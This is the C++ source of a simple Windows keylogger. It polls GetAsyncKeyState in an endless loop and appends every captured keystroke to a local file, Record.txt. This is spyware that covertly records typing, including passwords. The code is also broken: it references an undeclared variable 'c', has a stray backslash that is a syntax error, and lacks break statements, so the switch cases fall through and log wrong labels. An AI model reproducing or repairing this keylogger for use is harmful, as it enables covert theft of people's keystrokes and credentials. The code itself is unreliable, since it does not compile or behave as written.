/*
 * Keylogger.cpp
 *
 *  Created on: Jul 26, 2018
 *      Author: root
 */

#include <iostream>
#include <Windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void log();

int main()
{
	log();
	return 0;
}

void log()
{
	char key;

	for(;;)
	{
		for( key=8; key<=222; key++)
		{
			if(GetAsyncKeyState(c) == -32767)
			{
				ofstream write ("Record.txt", ios::app);

				if( (key>64)&&(key<91) && !(GetAsyncKeyState(0x10)) )
				{
					key+=32;
					write <<key;
					write.close();
					break;
				}
				else if((key>64)&&(key<91))
				{
					write <<key;
					write.close();
					break;
				}

				switch(key)
				{
					case 41:
					{
						if( GetAsyncKeyState(0x10) )
							write << "!";
					}
					case 8: write << "<Backspace>";
					case 27: write << "<ESC>"\;
					case 127: write << "<DEL>";
					case 32: write << " ";
					case 13: write << "<Enter>\n";
					default: write << key;
				}
			}
		}
	}
}
